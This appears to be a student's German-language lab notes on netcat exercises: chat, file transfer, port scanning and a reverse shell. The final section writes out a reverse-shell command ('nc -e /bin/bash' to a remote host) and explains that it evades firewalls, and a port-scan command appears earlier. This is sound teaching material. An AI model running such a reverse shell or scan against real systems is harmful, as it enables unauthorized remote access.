# Übung (netcat chat)
Um einen bidirektionalen Chat zwischen 2 Hosts aufzubauen, wird folgender Command verwendet werden.

**Server erstellen / an einem Port lauschen**
```bash
nc -l -p 1234
```

**Verbinden**
```bash
nc 192.168.1.50 1234
```

Jener der nun Text eingibt und Enter drückt, sendet an die Gegenseite den dementsprechenden Text.

# Übung (netcat data send)
Um ein File an einen anderen Host senden zu können, muss erstmals ein File freigegeben werden. Dies ist möglich mit:

**Senderseite**
```bash
netcat -l -p 1234 < test.txt
```

**Empfangsseite**
```bash
netcat 10.200.83.148 8000 > test.txt
```

Die Gegenseite muss lediglich wieder auf dem selben Port lauschen. Die Verbindung muss mittels STRG + C manuell beendet werden.

>**Hinweis**  
Um eine Verbindungen zwischen 2 Rechnern ermmöglichen zu können, muss das Schülernetz verwendet werden!

# Übung (netcat port scanning)
Um offene Ports scannen zu können, ist in meinem Fall die extra Option ``-v`` nötig, da sonst kein Service gefunden wird.

```bash
netcat -z -w 1 -v 172.16.0.4 1-1000
```

# Übung netcat (reverse shell)

**Command**
```bash
nc -e /bin/bash 10.20.30.40 4242
```

**Gegenstück**
```bash
netcat -l -p 4242
```

* **Warum nennt man das eine Reverse Shell?**  
Es wird Reverse Shell genannt, da das Opfer sich zum Angreifer verbindet, und nicht anders rum!  
* **Was ist der Vorteil? In welchem Fall wird, von wem, eine Reverse Shell verwendet?**  
Vorteilhaft, da Firewalls eingehende Verbindungen blockieren, in diesem Fall die Verbindung aber ausgehend ist!
